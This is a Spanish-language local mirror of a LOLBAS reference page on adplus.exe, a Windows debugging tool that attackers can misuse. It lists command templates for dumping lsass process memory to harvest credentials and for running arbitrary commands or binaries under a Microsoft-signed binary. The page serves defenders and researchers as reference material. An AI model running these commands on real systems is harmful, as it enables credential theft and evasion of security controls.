# LOLBAS: adplus.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Dump`, `Execute`

Debugging tool included with Windows Debugging Tools

## Comandos

### Create memory dump and parse it offline

Dump · priv: SYSTEM · T1003.001

```cmd
adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
```

Creates a memory dump of the lsass process

### Run commands under a trusted Microsoft signed binary

Execute · priv: User · T1127

```cmd
adplus.exe -c {PATH:.xml}
```

Execute arbitrary commands using adplus config file (see Resources section for a sample file).

### Run commands under a trusted Microsoft signed binary

Dump · priv: SYSTEM · T1003.001

```cmd
adplus.exe -c {PATH:.xml}
```

Dump process memory using adplus config file (see Resources section for a sample file).

### Run commands under a trusted Microsoft signed binary

Execute · priv: User · T1127

```cmd
adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}
```

Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.

